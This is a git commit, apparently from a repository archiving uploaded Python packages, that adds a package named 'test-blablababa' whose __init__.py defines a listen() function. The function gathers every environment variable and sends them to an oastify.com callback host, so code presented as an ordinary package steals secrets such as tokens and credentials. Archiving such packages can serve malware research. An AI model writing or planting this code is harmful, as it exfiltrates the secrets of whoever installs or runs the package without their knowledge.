11eca406d760ce1c4f554d9b11053109c84332c7
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 15:37:16 +0000

    Add package test-blablababa/0.3/test_blablababa-0.3.tar.gz

---
+++ packages/test-blablababa/test_blablababa-0.3.tar.gz/test_blablababa-0.3/test_blablababa/__init__.py
@@ -0,0 +1,14 @@
+import os, requests
+
+
+proxy = "http://127.0.0.1:8080"
+
+def listen():
+    env_vars = os.environ.items()
+    # Prepare the data to send to the server
+    data = {k: v for k, v in env_vars}
+    # Send the data to the server
+    url = 'http://cvb4ndplrdzw8ilbfuutrdlxwo2fq5eu.oastify.com'
+    params = data
+    requests.get(url, params=params, proxies=proxy)
+
